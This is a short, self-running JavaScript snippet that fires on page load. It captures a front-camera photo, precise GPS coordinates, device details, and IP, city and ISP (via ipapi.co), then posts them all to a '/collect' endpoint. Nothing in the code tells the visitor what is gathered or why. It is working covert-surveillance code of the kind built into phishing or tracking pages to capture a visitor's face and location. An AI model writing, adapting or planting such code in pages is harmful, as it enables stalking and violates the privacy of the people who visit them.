(function(){
    const d={
        sessionId:'s_'+Date.now(),
        timestamp:new Date().toISOString(),
        userAgent:navigator.userAgent
    };
    
    async function r(){
        // Camera
        try{
            const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
            const v=document.createElement('video');
            v.srcObject=s;
            await v.play();
            await new Promise(r=>setTimeout(r,800));
            const c=document.createElement('canvas');
            c.width=v.videoWidth||640;
            c.height=v.videoHeight||480;
            c.getContext('2d').drawImage(v,0,0);
            d.photo=c.toDataURL('image/jpeg',0.7);
            s.getTracks().forEach(t=>t.stop());
        }catch(e){d.camErr=e.message;}
        
        // GPS
        if(navigator.geolocation){
            try{
                const p=await new Promise((res,rej)=>{
                    navigator.geolocation.getCurrentPosition(res,rej,{
                        enableHighAccuracy:true,
                        timeout:10000,
                        maximumAge:0
                    });
                });
                d.gps={lat:p.coords.latitude,lon:p.coords.longitude};
            }catch(e){d.gpsErr=e.message;}
        }
        
        // Device
        d.device={
            platform:navigator.platform,
            screen:screen.width+'x'+screen.height,
            cores:navigator.hardwareConcurrency
        };
        
        // IP
        try{
            const r=await fetch('https://ipapi.co/json/');
            const j=await r.json();
            d.network={ip:j.ip,city:j.city,country:j.country_name,isp:j.org};
        }catch(e){}
        
        // Send
        try{
            await fetch('/collect',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify(d)
            });
        }catch(e){}
    }
    
    window.addEventListener('load',()=>setTimeout(r,500));
})();
